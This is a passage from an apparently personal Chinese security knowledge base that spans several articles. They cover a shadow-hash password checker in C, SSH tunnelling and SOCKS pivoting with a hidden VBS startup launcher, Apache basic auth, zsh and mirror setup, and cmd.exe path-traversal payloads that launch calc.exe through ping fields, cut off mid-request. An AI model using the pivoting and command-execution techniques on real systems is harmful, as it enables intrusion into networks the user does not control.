linxu引导启动后，会读取前文介绍的两个文件，读取到内存中，存入两个数据结构中（passwd结构和spwd结构），使用linux自身的函数获取用户名和密码，对密码进行运算后进行比较。从数学公式来讲，如下： value = f(InputPasswd,SaltString) 然后比较这个value的值与/etc/shadow中的值保存的是否一致。破解方式 原理介绍 ```cinclude include include include const char value = \"\";//这里是/etc/shadow中的hash值 const char password = \"\";//明文密码 const char salt = \"\"; int main(){ if (strcmp(value,crypt(password,salt)) == 0){//salt是盐的字符串 printf(\"[]Shadow-Hash-Value: %s\\n\",value); printf(\"[]Count-Hash-Value: %s\\n\",crypt(password,salt)); printf(\"[]Find-Password:%s\\n\", password); } return 0; } #### Test ```c # gcc a.c -lcrypt -o a #include #include #include #include const char *value = \"$6$Z0f28R2x$SkbWn/jFsxjQhHIijkLq6o1xIcvktjwABR5Gtfmx8L7zv******************.\";//这里是/etc/shadow中的hash值 const char *password = \"xx\";//明文密码 const char *salt = \"$6$Z0f28R2x$\"; int main(){ if (strcmp(value,crypt(password,salt)) == 0){//salt是盐的字符串 printf(\"[*]Shadow-Hash-Value: %s\\n\",value); printf(\"[*]Count-Hash-Value: %s\\n\",crypt(password,salt)); printf(\"[*]Find-Password:%s\\n\", password); } return 0; } Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 10:23:37 Author: aaron Url: https://byaaronluo.github.io/知识库/03.主机安全/08.Linux的账号口令机制及其爆破.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/03.主机安全/09.SSH建立隧道以及转发.html":{"url":"知识库/03.主机安全/09.SSH建立隧道以及转发.html","title":"09.SSH建立隧道以及转发","keywords":"","body":" 背景 实际问题 SSH 内网代理（穿透） ssh动态转发 问题解决 背景 说到ssh，没有和服务器打交道的人，都只知道ssh是用于远程连接服务器的一个协议吧，我在这里再粘贴一下百度百科： SSH 为 Secure Shell 的缩写，由 IETF 的网络小组（Network Working Group）所制定；SSH 为建立在应用层基础上的安全协议。SSH 是较可靠，专为远程登录会话和其他网络服务提供安全性的协议。利用 SSH 协议可以有效防止远程管理过程中的信息泄露问题。SSH最初是UNIX系统上的一个程序，后来又迅速扩展到其他操作平台。SSH在正确使用时可弥补网络中的漏洞。SSH客户端适用于多种平台。几乎所有UNIX平台—包括HP-UX、Linux、AIX、Solaris、Digital UNIX、Irix，以及其他平台，都可运行SSH 这篇文章主要是来聊聊ssh隧道及转发 实际问题 事情的起因是因为在做LVS架构加固时，内网某机器需要反向代理另一台公网机器的web服务，该web服务不对外开放，只能本地访问，用户只需要访问内网的web服务，然后建立隧道，从而达到访问外网web服务。 SSH 先抛开上述问题，我们来聊聊ssh ssh 用于登录远程主机, 并且在远程主机上执行命令. 它的目的是替换 rlogin和rsh, 同时在不安全的网络之上, 两个互不信任的主机之间, 提供加密的, 安全的通信连接. X11连接和任意 TCP/IP 端口均可以通过此安全通道转发(forward).当用户通过 连接并登录主机 hostname 后, 根据所用的协议版本, 用户必须通过下述方法之一向远程主机证明他/她的身份 ssh 在建立连接的时候会建立安全隧道，客户端和服务端会建立双向连接，那么在建立双向长连接的过程中是不是可以达到端口转发以及响应的目的呢？（其实VPN技术也可以这样简单理解，客户端与服务端建立了双向长连接，一个正向代理） 我们来看一下ssh的相关参数，（我也忘记从哪里抄来的了） 参数 -a 禁止转发认证代理的连接. -A 允许转发认证代理的连接. 可以在配置文件中对每个主机单独设定这个参数. 代理转发须谨慎. 某些用户能够在远程主机上绕过文件访问权限 (由于代理的 UNIX 域 socket), 他们可以通过转发的连接访问本地代理. 攻击者不可能从代理获得密钥内容, 但是他们能够操作这些密钥, 利用加载到代理上 的身份信息通过认证. -b bind_address 在拥有多个接口或地址别名的机器上, 指定收发接口. -c blowfish|3des|des 选择加密会话的密码术. 3des 是默认算法. 3des (triple-des) 用三支不同的密钥做加密-解密-加密三次运算, 被认为比较可靠. blowfish 是一种快速的分组加密术(block cipher), 非常安全, 而且速度比 3des 快的多. des 仅支持 客户端, 目的是能够和老式的不支持 3des 的协议第一版互操作. 由于其密码算法上的弱点, 强烈建议避免使用. -c cipher_spec 另外, 对于协议第二版, 这里可以指定一组用逗号隔开, 按优先顺序排列的密码术. 详见 Ciphers -e ch|^ch|none 设置 pty 会话的 escape 字符 (默认字符: \"`~'\") . escape 字符只在行首有效, escape 字符后面跟一个点 (\"`.'\" ) 表示结束连接, 跟一个 control-Z 表示挂起连接(suspend), 跟 escape 字符自己 表示输出这个字符. 把这个字符设为 ``none 则禁止 escape 功能, 使会话完全透明. -f 要求 在执行命令前退至后台. 它用于当 准备询问口令或密语, 但是用户希望它在后台进行. 该选项隐含了 -n 选项. 在远端机器上启动 X11 程序的推荐手法就是类似于 ssh -f host xterm 的命令. -g 允许远端主机连接本地转发的端口. -i identity_file 指定一个 RSA 或 DSA 认证所需的身份(私钥)文件. 默认文件是协议第一版的 $HOME/.ssh/identity 以及协议第二版的 $HOME/.ssh/id_rsa 和 $HOME/.ssh/id_dsa 文件. 也可以在配置文件中对每个主机单独指定身份文件. 可以同时使用多个 -i 选项 (也可以在配置文件中指定多个身份文件). -I smartcard_device 指定智能卡(smartcard)设备. 参数是设备文件, 能够用它和智能卡通信, 智能卡里面存储了用户的 RSA 私钥. -k 禁止转发 Kerberos 门票和 AFS 令牌. 可以在配置文件中对每个主机单独设定这个参数. -l login_name 指定登录远程主机的用户. 可以在配置文件中对每个主机单独设定这个参数. -m mac_spec 另外, 对于协议第二版, 这里可以指定一组用逗号隔开, 按优先顺序排列的 MAC(消息验证码)算法 (message authentication code). 详情以 MACs 为关键字查询. -n 把 stdin 重定向到 /dev/null (实际上防止从 stdin 读取数据). 在后台运行时一定会用到这个选项. 它的常用技巧是远程运行 X11 程序. 例如, ssh -n shadows.cs.hut.fi emacs 将会在 shadows.cs.hut.fi 上启动 emacs, 同时自动在加密通道中转发 X11 连接. 在后台运行. (但是如果 要求口令或密语, 这种方式就无法工作; 参见 -f 选项.) -N 不执行远程命令. 用于转发端口. (仅限协议第二版) -o option 可以在这里给出某些选项, 格式和配置文件中的格式一样. 它用来设置那些没有命令行开关的选项. -p port 指定远程主机的端口. 可以在配置文件中对每个主机单独设定这个参数. -q 安静模式. 消除所有的警告和诊断信息. -s 请求远程系统激活一个子系统. 子系统是 SSH2 协议的一个特性, 能够协助 其他应用程序(如 sftp)把SSH用做安全通路. 子系统通过远程命令指定. -t 强制分配伪终端. 可以在远程机器上执行任何全屏幕(screen-based)程序, 所以非常有用, 例如菜单服务. 并联的 -t 选项强制分配终端, 即使 没有本地终端. -T 禁止分配伪终端. -v 冗详模式. 使 打印关于运行情况的调试信息. 在调试连接, 认证和配置问题时非常有用. 并联的 -v 选项能够增加冗详程度. 最多为三个. -x 禁止 X11 转发. -X 允许 X11 转发. 可以在配置文件中对每个主机单独设定这个参数. 应该谨慎使用 X11 转发. 如果用户在远程主机上能够绕过文件访问权限 (根据用户的X授权数据库), 他就可以通过转发的连接访问本地 X11 显示器. 攻击者可以据此采取行动, 如监视键盘输入等. -C 要求进行数据压缩 (包括 stdin, stdout, stderr 以及转发 X11 和 TCP/IP 连接 的数据). 压缩算法和 gzip(1) 的一样, 协议第一版中, 压缩级别 ``level 用 CompressionLevel 选项控制. 压缩技术在 modem 线路或其他慢速连接上很有用, 但是在高速网络上反而 可能降低速度. 可以在配置文件中对每个主机单独设定这个参数. 另见 Compression 选项. -F configfile 指定一个用户级配置文件. 如果在命令行上指定了配置文件, 系统级配置文件 (/etc/ssh/ssh_config ) 将被忽略. 默认的用户级配置文件是 $HOME/.ssh/config -L port:host:hostport 将本地机(客户机)的某个端口转发到远端指定机器的指定端口. 工作原理是这样的, 本地机器上分配了一个 socket 侦听 port 端口, 一旦这个端口上有了连接, 该连接就经过安全通道转发出去, 同时远程主机和 host 的 hostport 端口建立连接. 可以在配置文件中指定端口的转发. 只有 root 才能转发特权端口. IPv6 地址用另一种格式说明: port/host/hostport -R port:host:hostport 将远程主机(服务器)的某个端口转发到本地端指定机器的指定端口. 工作原理是这样的, 远程主机上分配了一个 socket 侦听 port 端口, 一旦这个端口上有了连接, 该连接就经过安全通道转向出去, 同时本地主机和 host 的 hostport 端口建立连接. 可以在配置文件中指定端口的转发. 只有用 root 登录远程主机 才能转发特权端口. IPv6 地址用另一种格式说明: port/host/hostport -D port 指定一个本地机器动态的应用程序端口转发. 工作原理是这样的, 本地机器上分配了一个 socket 侦听 port 端口, 一旦这个端口上有了连接, 该连接就经过安全通道转发出去, 根据应用程序的协议可以判断出远程主机将和哪里连接. 目前支持 SOCKS4 协议, 将充当 SOCKS4 服务器. 只有 root 才能转发特权端口. 可以在配置文件中指定动态端口的转发. -1 强制 只使用协议第一版. -2 强制 只使用协议第二版. -4 强制 只使用 IPv4 地址. -6 强制 只使用 IPv6 地址. 其实建立隧道，端口转发只需要以下参数 -f 后台执行ssh指令 -C 允许压缩数据 -N 不执行远程指令 -R 将远程主机(服务器)的某个端口转发到本地端指定机器的指定端口 -L 本地端口转发 -D 动态端口转发 例如：下面的命令，-fCNR 指的是 后台执行shell，并要求数据压缩，并不执行远程命令，将远程服务器的1997端口的流量通过隧道转发到本地的22号端口，-o 参数中的ServerAliveInterval是防止连接不稳定，设置每60秒发送一次数据包 ssh -o ServerAliveInterval=60 -fCNR 47.103.xx.xx:1997:localhost:22 tommy@47.103.xx.xx -p 2892 ssh有一个机制，ssh建立隧道只能在本机的环回地址127.0.0.1上，我们只能登录VPS使用ssh指定port登录内网服务器 内网代理（穿透） 刚刚看了上面的例子，我们可以将远程服务器的端口流量转发到内网服务器的端口上，（remote:1997 => localhost:22）,从而可以从vps上访问内网地址。 使用ssh实现内网穿透有什么好处吗？ SSH 是专为远程登录会话和其他网络服务提供安全性的协议，利用 SSH 协议可以有效防止远程管理过程中的信息泄露问题，白话就是说，ssh的流量有层加密，一般在内网穿透的时候frp,lcx, NatByPass等工具都有明显的特征，在Linux上使用ssh不但可轻松绕过流量检测设备，也可以提供稳定的连接，但是缺点就是很容易暴露，不适合留做后门。 刚刚说了，ssh建立隧道只能在本机的环回地址127.0.0.1上，那么我们一定要登录自己的vps然后才访问吗？答案并不是这样，解决这个问题理论上需要开启一个对外可访问的端口，将该端口的流量转发到sshd的端口 那么使用iptables，firewalld可以吗？答案是不行，iptables，firewalld做转发是不能转发到本地环回地址，因为这是不安全的，如果需要强行修改，需要修改内核 # 根据实际情况修改 sysctl -w net.ipv4.conf.eth0.route_localnet=1 但是这里并不建议修改内核参数，因为修改之后就违背了Linux的安全机制，当时间久远或者服务器交接之后可能就忘了这个安全项，所以需要选用一个安全可靠的方法 这里我们使用ssh 的-L参数，将本地机(客户机)的某个端口转发到本地机器的指定端口（正向代理） 例如下面的命令，对外开放2017端口，并将2017端口的流量转发到1997端口 ssh -o ServerAliveInterval=60 -fCNL *:2017:localhost:1997 localhost -p 2892 现在流程是 remote:2017 => remote_localhost:1997 => localhost:22，在任意一台机器上，访问vps的2017端口，就会将流量先转发到1997端口，然后通过ssh隧道将流量反向转发到内网的kali上，如下图所示 ssh动态转发 SSH动态转发是 ssh 创建一个 socks v5 的服务并在 bind_address:bind_port 上侦听，当收到数据后，解析出需要连接的主机和端口并通道加密通道发送给 sshd，sshd 转发数据后并返回结果数据。 SSH动态转发就是SSH服务器使用的是正向匿名代理的作用，由内部机器将数据包通过socks发送到绑定端口，再通过sshd服务去请求目标服务。 ssh的动态转发在流量侧是加密流量，非常适用于外网拿下一台具有访问内网的机器之后，进行代理，攻击内网机器（前提是控制住一台Linux主机） 在linux中，通常使用如下命令，后台执行，再通过proxychains等工具直接代理到内网机器 nohup ssh -ND 1080 [username]@[ip] -p [port] & 在windows中，一般使用如下命令，后台执行 start /b ssh -ND 1080 [username]@[ip] -p [port] 但是在windows 中，只要关闭了cmd.exe ，就会关闭该进程，如果将其写入到.bat文件中，那么就会有非常丑陋的dos框 所以我的做法是写一个vbs，开机自启动bat文件 run.bat内容如下 start /b ssh -ND 1080 [username]@[ip] -p [port] run.vbs如下 Dim WinScriptHost Set WinScriptHost = CreateObject(\"WScript.Shell\") WinScriptHost.Run Chr(34) & \"\" & Chr(34), 0 Set WinScriptHost = Nothing 开机启动项的位置在，打开cmd.exe ，运行shell:startup 我在我的vps上启动一个web服务，前三个http请求就是我通过代理去访问的web服务，后三个http请求不是通过代理，可以看到，动态转发就是实现了一个匿名正向代理的一个过程 学会ssh动态转发，其实也就不用配置什么ss了，我相信你已经懂了 问题解决 回到最开始的问题，我们首先需要配置nginx反向代理，这里配置项就不贴出来，就是在内网开放web服务 然后将本地的端口流量转发到远程端口处（-L参数喔） 我在这里使用autossh, autossh的参数与ssh的参数是一致的，但是不同的是，在隧道断开的时候，autossh会自动重新连接而ssh不会（ssh需要配置-o 参数的 ServerAliveInterval，ServerAliveInterval可以保证每隔多长时间重新连接一次）。另外不同的是我们需要指出的-M参数，这个参数指定一个端口是远程主机用来接收内网机器的信息，如果隧道不正常而返回给内网机器让他实现重新连接。 使用M参数，监听本地端口，当ssh超时则自动重新连接 autossh -M 14431 -fCNL *:4431:192.168.0.18:8443 admin@xxx.xxx.xxx.xxx 使用autossh的好处有如下几点： autossh相当于一个守护进程，当ssh连接失效时，autossh 进程则会重新拉起ssh隧道，就不需要定时重连，这样的shell会更稳定 当出现断网的时候，如果使用ssh -o ServerAliveInterval 定时重连，则会失效 ps：使用autossh 需要将自己的公钥写入authorized_keys中 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 10:24:21 Author: aaron Url: https://byaaronluo.github.io/知识库/03.主机安全/09.SSH建立隧道以及转发.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/03.主机安全/10.如何在Ubuntu16.04上使用Apache设置密码身份验证.html":{"url":"知识库/03.主机安全/10.如何在Ubuntu16.04上使用Apache设置密码身份验证.html","title":"10.如何在Ubuntu16.04上使用Apache设置密码身份验证","keywords":"","body":" 介绍 先决条件 第1步 - 安装Apache Utilities包 第2步 - 创建密码文件 第3步 - 配置Apache密码身份验证 选项1：在虚拟主机定义中配置访问控制（首选） 选项2：使用.htaccess文件配置访问控制 第4步 - 确认密码验证 https://cloud.tencent.com/developer/article/1358394 介绍 在运行网站时，网站的某些部分通常会限制访问者。Web应用程序可以提供自己的身份验证和授权方法，但如果Web服务器不足或不可用，也可以使用Web服务器本身来限制访问。 在本指南中，我们将演示如何在Ubuntu 16.04上运行的Apache Web服务器上对资产进行密码保护。 先决条件 要完成本教程，您需要访问Ubuntu 16.04服务器。 此外，在开始之前，您将需要以下内容： 一个服务器上的sudo用户：您可以创建一个具有sudo权限用户按照的Ubuntu 16.04服务器初始设置指南进行设置，没有服务器的同学可以在这里购买，不过我个人更推荐您使用免费的腾讯云开发者实验室进行试验，学会安装后再购买服务器。 Apache2 Web服务器。 使用SSL保护的网站 ：如何设置该网站取决于您是否拥有网站的域名。 如果你有域名，保护你网站的最简单方法是使用腾讯云SSL证书服务，它提供免费的可信证书。腾讯云SSL证书安装操作指南进行设置。 如果你没有域名，建议您先去这里注册一个域名，如果你只是使用此配置进行测试或个人使用，则可以使用自签名证书，不需要购买域名。自签名证书提供了相同类型的加密，但没有域名验证公告。关于自签名证书，你可以参考为Apache创建自签名SSL证书和如何为Nginx创建自签名SSL证书这两篇文章。 当所有这些都到位后，以sudo用户身份登录您的服务器并继续下面。 第1步 - 安装Apache Utilities包 我们将使用名为apache2-utils包的一部分的实用程序htpasswd来创建文件并管理访问受限内容所需的用户名和密码。 sudo apt-get update sudo apt-get install apache2-utils 第2步 - 创建密码文件 我们现在可以访问该htpasswd命令。我们可以使用它来创建Apache可用于验证用户身份的密码文件。我们将在/etc/apache2配置目录中为此目的创建一个名为.htpasswd的隐藏文件。 我们第一次使用此实用程序时，需要添加-c选项以创建指定的文件。我们在命令末尾指定用户名（在此示例中为sammy）以在文件中创建新条目： sudo htpasswd -c /etc/apache2/.htpasswd sammy 系统将要求您提供并确认用户的密码。 省略您要添加的任何其他用户的-c参数： sudo htpasswd /etc/apache2/.htpasswd another_user 如果我们查看文件的内容，我们可以看到每条记录的用户名和加密密码： cat /etc/apache2/.htpasswd sammy:$apr1$.0CAabqX$rb8lueIORA/p8UzGPYtGs/ another_user:$apr1$fqH7UG8a$SrUxurp/Atfq6j7GL/VEC1 第3步 - 配置Apache密码身份验证 现在我们有一个文件，其中包含Apache可以读取的格式的用户和密码，我们需要配置Apache以在提供受保护内容之前检查此文件。我们可以通过以下两种方式之一完成此操作：直接在站点的虚拟主机文件中，或者将.htaccess文件放在需要限制的目录中。通常最好使用虚拟主机文件，但如果您需要允许非root用户管理自己的访问限制，请检查网站旁边的版本控制限制，或者使用.htaccess文件的Web应用程序已用于其他目的，看看第二个选项。 选择最适合您需求的选项。 选项1：在虚拟主机定义中配置访问控制（首选） 第一个选项是编辑Apache配置并将密码保护添加到虚拟主机文件。这通常会提供更好的性能，因为它避免了读取分布式配置文件的费用。此选项需要访问配置，该配置并非始终可用，但是当您确实有访问权限时，建议您访问。 首先打开要添加限制的虚拟主机文件。对于我们的示例，我们将使用包含通过Ubuntu的apache包安装的默认虚拟主机的000-default.conf文件： sudo nano /etc/apache2/sites-enabled/000-default.conf 在内部，删除了注释，文件看起来应该类似于： ServerAdmin webmaster@localhost DocumentRoot /var/www/html ErrorLog ${APACHE_LOG_DIR}/error.log CustomLog ${APACHE_LOG_DIR}/access.log combined 身份验证基于每个目录完成。要设置身份验证，您需要使用块来定位要限制的目录。在我们的示例中，我们将限制整个文档根目录，但您可以修改此列表以仅定位Web空间中的特定目录： ServerAdmin webmaster@localhost DocumentRoot /var/www/html ErrorLog ${APACHE_LOG_DIR}/error.log CustomLog ${APACHE_LOG_DIR}/access.log combined 在此目录块中，指定我们希望设置Basic身份验证。对于AuthName，请选择在提示输入凭据时将显示给用户的领域名称。使用该AuthUserFile指令将Apache指向我们创建的密码文件。最后，我们将要求valid-user访问此资源，这意味着任何可以使用密码验证其身份的人都将被允许： ServerAdmin webmaster@localhost DocumentRoot /var/www/html ErrorLog ${APACHE_LOG_DIR}/error.log CustomLog ${APACHE_LOG_DIR}/access.log combined AuthType Basic AuthName \"Restricted Content\" AuthUserFile /etc/apache2/.htpasswd Require valid-user 完成后保存并关闭文件。 在重新启动Web服务器之前，可以使用以下命令检查配置： sudo apache2ctl configtest 如果所有内容都已检出并获得Syntax OK，请重新启动服务器以实施密码策略。由于systemctl不显示所有服务管理命令的结果，我们将使用status以确保服务器正在运行： sudo systemctl restart apache2 sudo systemctl status apache2 现在，您指定的目录现在应该受密码保护。 选项2：使用.htaccess文件配置访问控制 Apache可以使用.htaccess文件以允许在内容目录中设置某些配置项。由于Apache必须在涉及目录的每个请求上重新读取这些文件，这会对性能产生负面影响，因此首选选项1，但如果您已经在使用.htaccess文件或需要允许非root用户管理限制，那么.htaccess文件合理。 要使用.htaccess文件启用密码保护，请打开主Apache配置文件： sudo nano /etc/apache2/apache2.conf 找到包含/var/www文档根目录的块。.htaccess通过将该块中的AllowOverride指令从“None”更改为“All”来打开处理： . . . Options Indexes FollowSymLinks AllowOverride All Require all granted . . . 完成后保存并关闭文件。 接下来，我们需要将.htaccess文件添加到我们希望限制的目录中。在我们的演示中，我们将限制基于/var/www/html的整个文档根目录（整个网站），但您可以将此文件放在您希望限制访问的任何目录中： sudo nano /var/www/html/.htaccess 在此文件中，指定我们希望设置Basic身份验证。对于AuthName，请选择在提示输入凭据时将显示给用户的领域名称。使用该AuthUserFile指令将Apache指向我们创建的密码文件。最后，我们将要求valid-user访问此资源，这意味着任何可以使用密码验证其身份的人都将被允许： AuthType Basic AuthName \"Restricted Content\" AuthUserFile /etc/apache2/.htpasswd Require valid-user 保存并关闭文件。重新启动Web服务器以使用该.htaccess文件密码保护目录中或目录下的所有内容，并使用systemctl status以验证重新启动是否成功： sudo systemctl restart apache2 sudo systemctl status apache2 第4步 - 确认密码验证 要确认您的内容受到保护，请尝试在网络浏览器中访问受限制的内容。您应该看到一个用户名和密码提示符，如下所示： 如果输入正确的凭据，则可以访问该内容。如果输入错误的凭据或点击“取消”，您将看到“未授权”错误页面： Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 10:24:22 Author: aaron Url: https://byaaronluo.github.io/知识库/03.主机安全/10.如何在Ubuntu16.04上使用Apache设置密码身份验证.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/03.主机安全/11.Ubuntu科学上网.html":{"url":"知识库/03.主机安全/11.Ubuntu科学上网.html","title":"11.Ubuntu科学上网","keywords":"","body":" QV2ray 下载及安装 QV2ray 使用 Qt 框架的跨平台 V2Ray 客户端。支持 Windows, Linux, macOS；插件系统支持 SSR / Trojan / Trojan-Go / NaiveProxy 下载及安装 https://github.com/Qv2ray/Qv2ray/releases 下载最新版，由于我搭建的环境vless协议，所以需要支持最新版的客户端以及v2ray内核 下载最新版v2ray-core https://github.com/v2fly/v2ray-core/releases 下载好之后，需要在Qv2ray 中配置 v2ray-core，如下图所示 第一个路径为v2ray-core中的二进制文件 第二个路径为v2ray-core的路径 然后点击check V2ray Core Setting，出现如下所示表示配置成功 然后开启开机启动即可 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 10:24:08 Author: aaron Url: https://byaaronluo.github.io/知识库/03.主机安全/11.Ubuntu科学上网.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/03.主机安全/12.Ubuntu配置zsh.html":{"url":"知识库/03.主机安全/12.Ubuntu配置zsh.html","title":"12.Ubuntu配置zsh","keywords":"","body":" zsh介绍 安装 下载zsh 配置 安装插件 修改配置文件 主题配置 终端 root用户使用zsh 权限问题 zsh介绍 zsh是一个Linux下强大的shell, 由于大多数Linux产品安装以及默认使用bash shell, 但是丝毫不影响极客们对zsh的热衷, 几乎每一款Linux产品都包含有zsh，通常可以用apt、urpmi或yum等包管理器进行安装. zsh是bash的增强版，其实zsh和bash是两个不同的概念，zsh更加强大。 通常zsh配置起来非常麻烦，且相当的复杂，所以oh-my-zsh是为了简化zsh的配置而开发的，因此oh-my-zsh算是zsh的配置. 安装 # 首先查看系统使用的shell echo $SHELL # 查看当前系统支持的所有的shell cat /etc/shells 下载zsh sudo apt install zsh 设置zsh为默认shell chsh -s /bin/zsh reboot touch ~/.zshrc 下载oh-my-zsh sh -c \"$(wget https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh -O -)\" 下载完成之后，就会出现如下图所示的界面 cd ~/.oh-my-zsh/custom/plugins/ 接下来就是配置以及git相关的东西了 配置 安装插件 cd ~/.oh-my-zsh/custom/plugins/ git clone https://github.com/zsh-users/zsh-autosuggestions git clone https://github.com/zsh-users/zsh-syntax-highlighting.git 修改配置文件 vim ~/.zshrc plugins=( git zsh-autosuggestions zsh-syntax-highlighting ) 在~/.zshrc文末添加 source ~/.oh-my-zsh/custom/plugins/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh 主题配置 由于一直玩鸟，所以我选择的shell主题是parrot的shell主题 vim ~/.zhsrc 修改主题为gnzh 使用 https://gist.github.com/Ares-X/52fe7faf9dda8b943c1a7f18654a2dbb#file-gnzh-zsh-theme 替换~/.oh-my-zsh/themes 下的 gnzh.zsh-theme source ~/.zshrc 终端 我使用了很多终端工具，最终确定还是比较喜欢Tilix sudo apt install tilix 修改默认终端 sudo update-alternatives --config x-terminal-emulator 在文件系统中配置open Tilix 我们配置完默认终端之后，在文件系统中右键点击 open terminal 发现并不是我们设置的默认终端 sudo apt-get install nautilus-actions /usr/bin/tilix --working-directory=%d/%b 保存之后，执行如下 nautilus -q root用户使用zsh 权限问题 # 复制相关文件到家目录即可 # 在.zshrc第一行添加 ZSH_DISABLE_COMPFIX=true Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 10:23:41 Author: aaron Url: https://byaaronluo.github.io/知识库/03.主机安全/12.Ubuntu配置zsh.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/03.主机安全/13.Ubuntu如何正确换源.html":{"url":"知识库/03.主机安全/13.Ubuntu如何正确换源.html","title":"13.Ubuntu如何正确换源","keywords":"","body":" 背景 Ubuntu代号 换源 更新缓存、升级 背景 换源很简单，修改/etc/apt/sources.list将提供的阿里源，清华源复制上去就欧克了，但是在更新源，以及更新软件的时候就会发现为什么换了源之后还是和之前国外源一样很慢很慢。 Ubuntu代号 Ubuntu各个版本都有代号，比如 4.10 Warty Warthog(长疣的疣猪) 5.04 Hoary Hedgehog(灰白的刺猬) 5.10 Breezy Badger(活泼的獾) 6.06(LTS) Dapper Drake(整洁的公鸭) 6.10 Edgy Eft(急躁的水蜥) 7.04 Feisty Fawn(坏脾气的小鹿) 7.10 Gutsy Gibbon(勇敢的长臂猿) 8.04(LTS) Hardy Heron(耐寒的苍鹭) 8.10 Intrepid Ibex (勇敢的野山羊) 9.04 Jaunty Jackalope(得意洋洋的怀俄明野兔) 9.10 Karmic Koala(幸运的考拉) 10.04(LTS) Lucid Lynx(清醒的猞猁) 10.10 Oneiric Ocelot(梦幻的豹猫) 11.04 Natty Narwhal(敏捷的独角鲸) 11.10 Oneiric Ocelot（有梦的虎猫） 12.04(LTS) Precise Pangolin(精准的穿山甲) 12.10 Quantal Quetzal(量子的绿咬鹃) 13.04 Raring Ringtail(铆足了劲的猫熊) 13.10 Saucy Salamander(活泼的蝾螈) 14.04(LTS) Trusty Tahr (可靠的塔尔羊)(LTS) 14.10 Utopic Unicorn(乌托邦独角兽) 15.04 Vivid Vervet (活泼的小猴) 15.10 Wily Werewolf (狡猾的狼人) 16.04(LTS) Xenial Xerus (好客的非洲地松鼠) 16.10 Yakkety Yak（牦牛） 17.04 Zesty Zapus(开心的跳鼠) 17.10 Artful Aardvark(机灵的土豚) 18.04(LTS) Bionic Beaver（仿生海狸） 18.10 Cosmic Cuttlefish（宇宙墨鱼） 19.04 Disco Dingo（舞动的灵犬） 19.10 Eoan Ermine（白貂） 20.04(LTS) Focal Fossa（专注的马达加斯加长尾狸猫） ... 再此同时，你要知道如何查看Ubuntu的代号 lsb_release -a 换源 去阿里源官网去查看是否有此代号的源，http://mirrors.aliyun.com/ubuntu/dists/ 可以看到，现在已经有了ubuntu 20.04(代号focal)的源了 在换源过程中，以此为模板，将下面的TODO换成你的CodeName deb http://mirrors.aliyun.com/ubuntu/ TODO main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ TODO main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ TODO-security main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ TODO-security main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ TODO-updates main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ TODO-updates main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ TODO-proposed main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ TODO-proposed main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ TODO-backports main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ TODO-backports main restricted universe multiverse 我的codename是focal，那么我的源就为如下所示： deb http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse 更新缓存、升级 apt update apt upgrade Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 10:24:23 Author: aaron Url: https://byaaronluo.github.io/知识库/03.主机安全/13.Ubuntu如何正确换源.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/03.主机安全/14.Windows_CMD.exe执行任意代码、命令、程序的漏洞.html":{"url":"知识库/03.主机安全/14.Windows_CMD.exe执行任意代码、命令、程序的漏洞.html","title":"14.Windows_CMD.exe执行任意代码、命令、程序的漏洞","keywords":"","body":" 利用方式 可能的使用场景 一些基于windows 系统的设备 web管理页面 远程下载文件 利用方式 cmd.exe /c \"ping 127.0.0.1/../../../../../../../../../../../../../windows/system32/calc.exe\" 当然也不知ping命令还有一些也可以，例如下列 cmd.exe /c \"whoami 127.0.0.1/../../../../../../../../../../../../../../../windows/system32/calc.exe\" cmd.exe /c \"nslookup 127.0.0.1/../../../../../../../../../../../../../../../windows/system32/calc.exe\" 可能的使用场景 一些基于windows 系统的设备 web管理页面 我们经常遇到一些基于Windows系统的设备，在其管理页面上具备ping功能，其目的是为了进行连通性测试或者资产发现等等。当然一些网站可能也有类似的功能。由于开发者安全意识的提高，以及SDL的推广落地，直接进行OS Command Injection的可能性非常低。利用这个方法解和上传漏洞（如果存在的话可以执行任何代码） windows 客户端测试不通过，在windows server 2012 测试如下 POST /ping.php HTTP/1.1 Host: 192.168.93.143 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like 